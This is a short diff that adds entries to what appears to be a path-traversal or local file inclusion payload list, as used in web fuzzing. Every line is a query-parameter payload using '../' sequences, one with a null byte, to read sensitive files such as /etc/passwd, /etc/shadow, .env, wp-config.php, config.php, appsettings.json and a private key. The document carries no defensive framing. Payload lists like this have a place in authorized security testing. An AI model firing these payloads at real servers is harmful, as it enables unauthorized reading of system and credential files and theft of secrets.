@@ -3,3 +3,11 @@
 ?lang=../../../../etc/passwd%00
 ?locale=../../config
 ?template=../../etc/shadow
+?skin=../../private/key
+?module=../../../../etc/hosts
+?include=../../etc/passwd
+?page=../../config.php
+?view=../../.env
+?style=../../etc/passwd
+?format=../../../wp-config.php
+?layout=../../appsettings.json
